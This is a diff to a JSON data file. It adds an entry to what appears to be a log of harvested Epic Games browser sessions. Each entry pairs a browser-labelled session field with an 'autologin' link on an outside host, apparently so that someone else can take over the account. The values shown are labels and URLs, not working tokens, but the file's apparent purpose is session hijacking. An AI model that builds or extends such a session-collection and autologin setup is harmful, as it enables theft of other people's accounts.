@@ -650,6 +650,12 @@
             "token": "[Brave - EPICGAMES Link/Session]:\nhttps://www.epicgames.com/site/\naccount/personal?productName=egs",
             "link": "https://threesrh-system-data.onrender.com/autologin?platform=epic&token=%5BBrave%20-%20EPICGAMES%20Link%2FSession%5D%3A%0Ahttps%3A%2F%2Fwww.epicgames.com%2Fsite%2F%0Aaccount%2Fpersonal%3FproductName%3Degs",
             "time": 1789434792
+        },
+        {
+            "platform": "epic",
+            "token": "[Chrome - EPICGAMES Link/ Session]: https:// store.epicgames.com/",
+            "link": "https://threesrh-system-data.onrender.com/autologin?platform=epic&token=%5BChrome%20-%20EPICGAMES%20Link%2F%20Session%5D%3A%20https%3A%2F%2F%20store.epicgames.com%2F",
+            "time": 1789434871
         }
     ]
 }
